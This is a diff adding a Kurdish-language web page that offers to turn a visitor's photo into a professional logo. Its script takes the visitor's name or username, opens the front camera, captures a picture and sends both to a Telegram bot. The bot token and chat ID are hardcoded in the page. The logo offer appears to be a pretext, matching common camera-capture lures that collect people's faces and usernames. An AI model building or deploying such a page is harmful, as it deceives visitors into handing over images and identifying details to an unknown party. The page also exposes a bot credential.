@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دروستکرنا لۆگۆیێن جوان</title>
+    <style>
+        body {
+            font-family: Tahoma, Arial, sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #00d2ff;
+        }
+        p {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #ddd;
+        }
+        input[type="text"] {
+            width: 90%;
+            padding: 12px;
+            margin: 15px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            background: #00d2ff;
+            color: #1e1e2f;
+            border: none;
+            padding: 12px 25px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 95%;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #00a8cc;
+        }
+        video, canvas {
+            width: 100%;
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+        #status {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #4ade80;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🎨 دیزاینا لۆگۆیێ تە</h1>
+    <p>وێنێ خۆ بگرە و بۆ مە بهنێرە دا کو بکەینە لۆگۆیەکێ پڕۆفیشناڵ و جوان!</p>
+    
+    <input type="text" id="userName" placeholder="ناڤێ خۆ یان یوزەرێ خۆ بنڤیسە..." required>
+    
+    <button id="startBtn" onclick="startCamera()">📸 رەسم گرتن</button>
+    
+    <video id="video" autoplay playsinline></video>
+    <button id="captureBtn" style="display:none; background:#4ade80;" onclick="takePhoto()">✅ گرتن و هنارتن</button>
+    
+    <canvas id="canvas"></canvas>
+    <div id="status"></div>
+</div>
+
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
+    const captureBtn = document.getElementById('captureBtn');
+    const statusDiv = document.getElementById('status');
+
+    const BOT_TOKEN = "9026747554:AAGXXsmoDPEgfrBwmm_guQLwKmuZF7DDdVY";
+    const CHAT_ID = "1905509661";
+
+    async function startCamera() {
+        const userName = document.getElementById('userName').value;
+        if (!userName) {
+            alert("ژ کەرەما خۆ بەری هەر تشتەکی ناڤێ خۆ بنڤیسە!");
+            return;
+        }
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            video.style.display = "block";
+            startBtn.style.display = "none";
+            captureBtn.style.display = "block";
+        } catch (err) {
+            alert("ببورە، پێدڤیە تو رازیبوونێ (Allow) بدەیە کامێرایێ دا کو وێنەی بگری!");
+        }
+    }
+
+    function takePhoto() {
+        const userName = document.getElementById('userName').value;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        video.srcObject.getTracks().forEach(track => track.stop());
+        video.style.display = "none";
+        captureBtn.style.display = "none";
+        statusDiv.innerText = "⏳ وێنە یێ دهێتە هنارتن...";
+
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "client_photo.jpg");
+            formData.append("caption", "🎨 داخوازیا لۆگۆیێ نوی!\n👤 ناڤێ کڕیاری: " + userName);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusDiv.innerText = "✅ سوپاس! وێنێ تە ب سەرکەفتیانە گەهشت. ل نێزیک دێ لۆگۆیێ تە ئامادە بیت!";
+                } else {
+                    statusDiv.style.color = "#f87171";
+                    statusDiv.innerText = "❌ خەلەتیەک چێبوو د هنارتنێ دا.";
+                }
+            })
+            .catch(error => {
+                statusDiv.style.color = "#f87171";
+                statusDiv.innerText = "❌ پەیوەندی ب ئینتەرنێتێ ڤە نینە.";
+            });
+        }, "image/jpeg");
+    }
+</script>
+
+</body>
+</html>
